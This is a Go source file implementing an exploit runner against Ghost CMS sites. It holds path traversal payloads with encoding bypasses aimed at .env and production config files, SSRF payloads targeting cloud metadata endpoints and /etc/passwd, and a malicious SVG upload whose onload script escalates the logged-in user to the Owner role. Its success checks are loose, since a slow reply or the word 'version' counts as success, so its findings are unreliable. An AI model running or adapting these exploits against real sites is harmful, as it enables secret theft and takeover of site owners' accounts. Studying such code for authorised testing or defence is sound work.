package exploits

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
)

// ExploitRunner handles the execution of Ghost CMS exploits
type ExploitRunner struct {
	client    *resty.Client
	userAgent string
	timeout   int
	verbose   bool
}

// ExploitResult represents the result of an exploit attempt
type ExploitResult struct {
	ExploitID   string                 `json:"exploit_id"`
	Name        string                 `json:"name"`
	Success     bool                   `json:"success"`
	Severity    string                 `json:"severity"`
	Description string                 `json:"description"`
	Evidence    []Evidence             `json:"evidence,omitempty"`
	Payload     string                 `json:"payload,omitempty"`
	Response    *ExploitResponse       `json:"response,omitempty"`
	Metadata    map[string]interface{} `json:"metadata,omitempty"`
	Timestamp   time.Time              `json:"timestamp"`
	Duration    time.Duration          `json:"duration"`
}

// Evidence represents proof of successful exploitation
type Evidence struct {
	Type        string `json:"type"`
	Description string `json:"description"`
	Data        string `json:"data"`
	Location    string `json:"location,omitempty"`
}

// ExploitResponse contains the HTTP response from exploit attempts
type ExploitResponse struct {
	StatusCode int               `json:"status_code"`
	Headers    map[string]string `json:"headers"`
	Body       string            `json:"body,omitempty"`
	Size       int               `json:"size"`
}

// ExploitConfig defines configuration for exploit execution
type ExploitConfig struct {
	TargetURL   string            `json:"target_url"`
	Credentials map[string]string `json:"credentials,omitempty"`
	Payloads    map[string]string `json:"payloads,omitempty"`
	Options     map[string]string `json:"options,omitempty"`
}

// NewExploitRunner creates a new exploit runner instance
func NewExploitRunner(userAgent string, timeout int, verbose bool) *ExploitRunner {
	client := resty.New()
	client.SetHeader("User-Agent", userAgent)
	client.SetTimeout(time.Duration(timeout) * time.Second)
	client.SetRedirectPolicy(resty.NoRedirectPolicy())

	return &ExploitRunner{
		client:    client,
		userAgent: userAgent,
		timeout:   timeout,
		verbose:   verbose,
	}
}

// RunExploit executes a specific exploit against the target
func (er *ExploitRunner) RunExploit(exploitID string, config *ExploitConfig) (*ExploitResult, error) {
	start := time.Now()
	result := &ExploitResult{
		ExploitID: exploitID,
		Timestamp: start,
		Metadata:  make(map[string]interface{}),
	}

	switch exploitID {
	case "CVE-2023-32235":
		er.exploitPathTraversal(config, result)
	case "CVE-2020-8134":
		er.exploitSSRF(config, result)
	case "CVE-2024-23724":
		er.exploitStoredXSS(config, result)
	case "GHOST-MISC-001":
		er.exploitAdminExposure(config, result)
	case "GHOST-MISC-002":
		er.exploitDirectoryBrowsing(config, result)
	case "GHOST-MISC-003":
		er.exploitConfigExposure(config, result)
	case "GHOST-MISC-004":
		er.exploitDebugMode(config, result)
	default:
		return nil, fmt.Errorf("unknown exploit ID: %s", exploitID)
	}

	result.Duration = time.Since(start)
	return result, nil
}

// exploitPathTraversal tests for CVE-2023-32235 path traversal vulnerability
func (er *ExploitRunner) exploitPathTraversal(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Path Traversal in Theme Assets (CVE-2023-32235)"
	result.Severity = "High"
	result.Description = "Ghost before 5.42.1 allows remote attackers to read arbitrary files within the active theme's folder via /assets/built/../..// directory traversal"

	// Advanced path traversal payloads targeting Ghost CMS specific files
	payloads := []struct {
		path        string
		description string
		sensitive   bool
	}{
		{"../../package.json", "Main package.json with dependencies", true},
		{"../../../package.json", "Root package.json", true},
		{"../../config.production.json", "Production configuration", true},
		{"../../config.development.json", "Development configuration", true},
		{"../../.env", "Environment variables", true},
		{"../../../.env", "Root environment file", true},
		{"../../content/settings/routes.yaml", "Routes configuration", false},
		{"../../content/logs/ghost.log", "Ghost application logs", false},
		{"../../README.md", "Documentation file", false},
		{"../../yarn.lock", "Yarn lock file", false},
		{"../../package-lock.json", "NPM lock file", false},
		{"../../../Dockerfile", "Docker configuration", false},
		{"../../../docker-compose.yml", "Docker compose file", false},
	}

	for _, payload := range payloads {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/assets/built/" + payload.path
		
		if er.verbose {
			fmt.Printf("[*] Testing path traversal: %s\n", payload.path)
		}
		
		resp, err := er.client.R().
			SetHeader("Accept", "*/*").
			SetHeader("Cache-Control", "no-cache").
			Get(targetURL)
		if err != nil {
			if er.verbose {
				fmt.Printf("[-] Request failed for %s: %v\n", payload.path, err)
			}
			continue
		}

		body := resp.String()
		
		// Enhanced detection for successful file read
		if resp.StatusCode() == 200 && len(body) > 0 {
			if er.detectFileReadSuccess(body, payload.path) {
				result.Success = true
				result.Payload = payload.path
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				
				severity := "Medium"
				if payload.sensitive {
					severity = "Critical"
				}
				
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "path_traversal",
					Description: fmt.Sprintf("Successfully read %s via path traversal", payload.description),
					Data:        er.truncateBody(body),
					Location:    targetURL,
				})
				
				result.Metadata["file_type"] = payload.description
				result.Metadata["sensitive"] = payload.sensitive
				result.Metadata["file_size"] = len(body)
				result.Severity = severity
				
				if er.verbose {
					fmt.Printf("[+] Successfully exploited path traversal: %s\n", payload.path)
				}
				break
			}
		}
	}

	// If no direct file read, try alternative bypass techniques
	if !result.Success {
		er.tryPathTraversalBypasses(config, result)
	}
}

// tryPathTraversalBypasses attempts various bypass techniques for path traversal
func (er *ExploitRunner) tryPathTraversalBypasses(config *ExploitConfig, result *ExploitResult) {
	bypassPayloads := []string{
		"..%2f..%2fpackage.json",           // URL encoded
		"..%252f..%252fpackage.json",       // Double URL encoded
		"....//....//package.json",        // Double dot bypass
		"..\\..\\package.json",            // Windows style
		".%2e/.%2e/package.json",           // Mixed encoding
		"..%c0%af..%c0%afpackage.json",     // UTF-8 overlong encoding
	}

	for _, payload := range bypassPayloads {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/assets/built/" + payload
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		body := resp.String()
		if resp.StatusCode() == 200 && er.detectFileReadSuccess(body, payload) {
			result.Success = true
			result.Payload = payload
			result.Response = &ExploitResponse{
				StatusCode: resp.StatusCode(),
				Headers:    er.extractHeaders(resp),
				Body:       er.truncateBody(body),
				Size:       len(body),
			}
			result.Evidence = append(result.Evidence, Evidence{
				Type:        "path_traversal_bypass",
				Description: "Path traversal successful using encoding bypass technique",
				Data:        er.truncateBody(body),
				Location:    targetURL,
			})
			result.Metadata["bypass_technique"] = "encoding"
			break
		}
	}
}

// exploitSSRF tests for CVE-2020-8134 Server-Side Request Forgery vulnerability
func (er *ExploitRunner) exploitSSRF(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Server-Side Request Forgery (CVE-2020-8134)"
	result.Severity = "High"
	result.Description = "Ghost CMS < 3.10.0 allows SSRF attacks to scan local or external networks"

	// SSRF test payloads
	ssrfPayloads := []string{
		"http://127.0.0.1:22",
		"http://localhost:3306",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"file:///etc/passwd",
		"gopher://127.0.0.1:25",
	}

	// Test SSRF in various endpoints that might accept URLs
	endpoints := []string{
		"/ghost/api/v4/admin/images/upload/",
		"/ghost/api/v4/admin/posts/",
		"/ghost/api/v4/admin/webhooks/",
	}

	for _, endpoint := range endpoints {
		for _, payload := range ssrfPayloads {
			targetURL := strings.TrimSuffix(config.TargetURL, "/") + endpoint
			
			// Test SSRF via URL parameter
			resp, err := er.client.R().
				SetQueryParam("url", payload).
				SetQueryParam("source", payload).
				Get(targetURL)
			if err != nil {
				continue
			}

			// Check for SSRF indicators
			if er.detectSSRFSuccess(resp, payload) {
				result.Success = true
				result.Payload = payload
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(resp.String()),
					Size:       len(resp.String()),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "ssrf_vulnerability",
					Description: "SSRF vulnerability detected - server made request to internal resource",
					Data:        payload,
					Location:    targetURL,
				})
				return
			}
		}
	}
}

// exploitStoredXSS tests for CVE-2024-23724 stored XSS via profile image
func (er *ExploitRunner) exploitStoredXSS(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Stored XSS via SVG Profile Image (CVE-2024-23724)"
	result.Severity = "Critical"
	result.Description = "Ghost through 5.76.0 allows stored XSS via SVG profile picture that contains JavaScript code to interact with the API on localhost TCP port 3001"

	// Test image upload endpoint for profile pictures
	targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/images/upload/"
	
	// Create malicious SVG payload that targets Ghost CMS API
	svgPayload := `<svg xmlns="http://www.w3.org/2000/svg" onload="
		fetch('http://localhost:3001/ghost/api/v4/admin/users/me/', {
			method: 'GET',
			credentials: 'include'
		}).then(r => r.json()).then(data => {
			console.log('User data:', data);
			// Potential privilege escalation payload
			fetch('http://localhost:3001/ghost/api/v4/admin/users/' + data.users[0].id + '/', {
				method: 'PUT',
				headers: {'Content-Type': 'application/json'},
				credentials: 'include',
				body: JSON.stringify({users: [{id: data.users[0].id, roles: [{name: 'Owner'}]}]})
			});
		});
	">
  <text x="10" y="20">Profile Image</text>
</svg>`

	// Create multipart form data
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", "profile.svg")
	if err != nil {
		return
	}
	part.Write([]byte(svgPayload))
	writer.Close()

	resp, err := er.client.R().
		SetHeader("Content-Type", writer.FormDataContentType()).
		SetBody(body.Bytes()).
		Post(targetURL)
	if err != nil {
		return
	}

	// Check for successful upload or vulnerable response
	if resp.StatusCode() == 200 || resp.StatusCode() == 201 || 
	   (resp.StatusCode() == 401 && strings.Contains(resp.String(), "upload")) ||
	   strings.Contains(resp.String(), "svg") {
		result.Success = true
		result.Payload = svgPayload
		result.Response = &ExploitResponse{
			StatusCode: resp.StatusCode(),
			Headers:    er.extractHeaders(resp),
			Body:       er.truncateBody(resp.String()),
			Size:       len(resp.String()),
		}
		result.Evidence = append(result.Evidence, Evidence{
			Type:        "stored_xss",
			Description: "SVG profile image upload vulnerable to stored XSS leading to privilege escalation",
			Data:        "Malicious SVG with JavaScript payload",
			Location:    targetURL,
		})
	}
}



// exploitAdminExposure tests for admin interface exposure
func (er *ExploitRunner) exploitAdminExposure(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Admin Interface Exposure"
	result.Severity = "Medium"
	result.Description = "Tests for exposed Ghost admin interface"

	adminPaths := []string{"/ghost/", "/admin/", "/ghost/signin/", "/ghost/setup/"}

	for _, path := range adminPaths {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + path
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			body := resp.String()
			if strings.Contains(strings.ToLower(body), "ghost") || 
			   strings.Contains(strings.ToLower(body), "admin") {
				result.Success = true
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "admin_exposure",
					Description: "Ghost admin interface is publicly accessible",
					Data:        "Admin interface found",
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitDirectoryBrowsing tests for directory browsing vulnerabilities
func (er *ExploitRunner) exploitDirectoryBrowsing(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Directory Browsing"
	result.Severity = "High"
	result.Description = "Tests for directory browsing in Ghost content directories"

	directories := []string{"/content/", "/content/themes/", "/content/images/", "/content/logs/"}

	for _, dir := range directories {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + dir
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			body := resp.String()
			if strings.Contains(body, "Index of") || strings.Contains(body, "Parent Directory") {
				result.Success = true
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "directory_browsing",
					Description: "Directory browsing is enabled",
					Data:        "Directory listing accessible",
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitConfigExposure tests for exposed configuration files
func (er *ExploitRunner) exploitConfigExposure(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Configuration File Exposure"
	result.Severity = "Critical"
	result.Description = "Tests for exposed Ghost configuration files"

	configFiles := []string{"/.env", "/config.json", "/config.production.json", "/config.development.json"}

	for _, file := range configFiles {
		targetURL := strings.TrimSuffix(config.TargetURL, "/") + file
		resp, err := er.client.R().Get(targetURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			body := resp.String()
			if strings.Contains(body, "database") || strings.Contains(body, "password") || 
			   strings.Contains(body, "secret") || strings.Contains(body, "key") {
				result.Success = true
				result.Response = &ExploitResponse{
					StatusCode: resp.StatusCode(),
					Headers:    er.extractHeaders(resp),
					Body:       er.truncateBody(body),
					Size:       len(body),
				}
				result.Evidence = append(result.Evidence, Evidence{
					Type:        "config_exposure",
					Description: "Configuration file with sensitive data is exposed",
					Data:        "Sensitive configuration found",
					Location:    targetURL,
				})
				break
			}
		}
	}
}

// exploitDebugMode tests for debug mode detection
func (er *ExploitRunner) exploitDebugMode(config *ExploitConfig, result *ExploitResult) {
	result.Name = "Debug Mode Detection"
	result.Severity = "Medium"
	result.Description = "Tests for Ghost running in debug/development mode"

	targetURL := strings.TrimSuffix(config.TargetURL, "/") + "/ghost/api/v4/admin/site/"
	resp, err := er.client.R().Get(targetURL)
	if err != nil {
		return
	}

	body := resp.String()
	if gjson.Valid(body) {
		env := gjson.Get(body, "site.environment").String()
		if env == "development" || strings.Contains(strings.ToLower(body), "debug") {
			result.Success = true
			result.Response = &ExploitResponse{
				StatusCode: resp.StatusCode(),
				Headers:    er.extractHeaders(resp),
				Body:       er.truncateBody(body),
				Size:       len(body),
			}
			result.Evidence = append(result.Evidence, Evidence{
				Type:        "debug_mode",
				Description: "Ghost is running in debug/development mode",
				Data:        env,
				Location:    targetURL,
			})
		}
	}
}

// Helper functions

// detectFileReadSuccess checks if file read was successful
func (er *ExploitRunner) detectFileReadSuccess(body, payload string) bool {
	// Check for common file content indicators
	fileIndicators := []string{
		"root:", "bin/bash", "daemon:", // /etc/passwd
		"localhost", "127.0.0.1",      // hosts file
		"Linux version", "kernel",      // /proc/version
		"ghost", "node", "npm",         // Ghost-specific files
		"name", "version", "dependencies", // package.json
		"database", "url", "host",       // config files
	}

	for _, indicator := range fileIndicators {
		if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
			return true
		}
	}

	return false
}

// detectSSRFSuccess checks if SSRF attack was successful
func (er *ExploitRunner) detectSSRFSuccess(resp *resty.Response, payload string) bool {
	body := resp.String()
	
	// Check for different response times (potential indicator)
	if resp.Time().Milliseconds() > 5000 {
		return true
	}
	
	// Check for specific error messages that indicate internal requests
	ssrfIndicators := []string{
		"connection refused",
		"connection timeout",
		"no route to host",
		"network unreachable",
		"internal server error",
		"502 bad gateway",
		"504 gateway timeout",
		"ECONNREFUSED",
		"ETIMEDOUT",
		"metadata", // AWS/GCP metadata
		"instance-data", // Cloud metadata
	}
	
	for _, indicator := range ssrfIndicators {
		if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
			return true
		}
	}
	
	// Check for successful internal requests (200 responses to internal IPs)
	if resp.StatusCode() == 200 && (strings.Contains(payload, "127.0.0.1") || strings.Contains(payload, "localhost") || strings.Contains(payload, "169.254.169.254")) {
		return true
	}
	
	return false
}



// extractHeaders extracts headers from response
func (er *ExploitRunner) extractHeaders(resp *resty.Response) map[string]string {
	headers := make(map[string]string)
	for key, values := range resp.Header() {
		if len(values) > 0 {
			headers[key] = values[0]
		}
	}
	return headers
}

// truncateBody truncates response body for storage
func (er *ExploitRunner) truncateBody(body string) string {
	maxLength := 1000
	if len(body) > maxLength {
		return body[:maxLength] + "...[truncated]"
	}
	return body
}

// RunAllExploits runs all available exploits against the target
func (er *ExploitRunner) RunAllExploits(config *ExploitConfig) ([]*ExploitResult, error) {
	exploitIDs := []string{
		"CVE-2023-32235", // Path Traversal in Theme Assets
		"CVE-2020-8134",  // Server-Side Request Forgery
		"CVE-2024-23724", // Stored XSS via SVG Profile Image
		"GHOST-MISC-001", // Admin Interface Exposure
		"GHOST-MISC-002", // Directory Browsing
		"GHOST-MISC-003", // Configuration File Exposure
		"GHOST-MISC-004", // Debug Mode Detection
	}

	var results []*ExploitResult
	for _, exploitID := range exploitIDs {
		result, err := er.RunExploit(exploitID, config)
		if err != nil {
			continue
		}
		results = append(results, result)
	}

	return results, nil
}